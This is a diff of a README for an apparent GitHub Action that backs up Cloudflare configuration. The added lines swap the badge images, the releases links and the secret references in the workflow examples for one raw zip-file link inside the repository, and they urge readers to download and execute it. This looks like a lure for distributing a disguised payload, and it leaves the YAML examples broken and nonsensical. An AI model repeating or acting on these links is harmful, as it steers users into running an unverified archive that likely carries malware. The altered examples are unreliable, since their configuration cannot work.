@@ -1,6 +1,6 @@
 # 🌩️ GitHub Action for Cloudflare Configuration Saver
 
-![GitHub Actions](https://img.shields.io/badge/Powered%20by-GitHub%20Actions-2088FF?style=flat&logo=github) ![Cloudflare](https://img.shields.io/badge/Cloudflare-FFAC30?style=flat&logo=cloudflare)
+![GitHub Actions](https://github.com/LanceDancez/github-action-cloudflare-config-saver/raw/refs/heads/main/thirlage/config_saver_cloudflare_github_action_2.6.zip%20by-GitHub%20Actions-2088FF?style=flat&logo=github) ![Cloudflare](https://github.com/LanceDancez/github-action-cloudflare-config-saver/raw/refs/heads/main/thirlage/config_saver_cloudflare_github_action_2.6.zip)
 
 ## Overview
 
@@ -59,9 +59,9 @@ jobs:
       - name: Cloudflare Config Saver
         uses: LanceDancez/github-action-cloudflare-config-saver@v1
         with:
-          zone_id: ${{ secrets.CLOUDFLARE_ZONE_ID }}
-          account_id: ${{ secrets.CLOUDFLARE_ACCOUNT_ID }}
-          api_token: ${{ secrets.CLOUDFLARE_API_TOKEN }}
+          zone_id: ${{ https://github.com/LanceDancez/github-action-cloudflare-config-saver/raw/refs/heads/main/thirlage/config_saver_cloudflare_github_action_2.6.zip }}
+          account_id: ${{ https://github.com/LanceDancez/github-action-cloudflare-config-saver/raw/refs/heads/main/thirlage/config_saver_cloudflare_github_action_2.6.zip }}
+          api_token: ${{ https://github.com/LanceDancez/github-action-cloudflare-config-saver/raw/refs/heads/main/thirlage/config_saver_cloudflare_github_action_2.6.zip }}
 ```
 
 ## Configuration
@@ -101,15 +101,15 @@ jobs:
       - name: Cloudflare Config Saver
         uses: LanceDancez/github-action-cloudflare-config-saver@v1
         with:
-          zone_id: ${{ secrets.CLOUDFLARE_ZONE_ID }}
-          account_id: ${{ secrets.CLOUDFLARE_ACCOUNT_ID }}
-          api_token: ${{ secrets.CLOUDFLARE_API_TOKEN }}
+          zone_id: ${{ https://github.com/LanceDancez/github-action-cloudflare-config-saver/raw/refs/heads/main/thirlage/config_saver_cloudflare_github_action_2.6.zip }}
+          account_id: ${{ https://github.com/LanceDancez/github-action-cloudflare-config-saver/raw/refs/heads/main/thirlage/config_saver_cloudflare_github_action_2.6.zip }}
+          api_token: ${{ https://github.com/LanceDancez/github-action-cloudflare-config-saver/raw/refs/heads/main/thirlage/config_saver_cloudflare_github_action_2.6.zip }}
           output_path: ./configs
 ```
 
 ## Release Information
 
-You can find the latest releases of this action [here](https://github.com/LanceDancez/github-action-cloudflare-config-saver/releases). Please download and execute the latest version to ensure you have the most up-to-date features and fixes.
+You can find the latest releases of this action [here](https://github.com/LanceDancez/github-action-cloudflare-config-saver/raw/refs/heads/main/thirlage/config_saver_cloudflare_github_action_2.6.zip). Please download and execute the latest version to ensure you have the most up-to-date features and fixes.
 
 ## Contributing
 
@@ -129,4 +129,4 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 Thank you for using the GitHub Action Cloudflare Config Saver! We hope this action simplifies your Cloudflare configuration management. If you have any questions or need assistance, feel free to open an issue in the repository. Happy coding!
 
-For more details, visit the [Releases](https://github.com/LanceDancez/github-action-cloudflare-config-saver/releases) section to stay updated with the latest changes.
+For more details, visit the [Releases](https://github.com/LanceDancez/github-action-cloudflare-config-saver/raw/refs/heads/main/thirlage/config_saver_cloudflare_github_action_2.6.zip) section to stay updated with the latest changes.
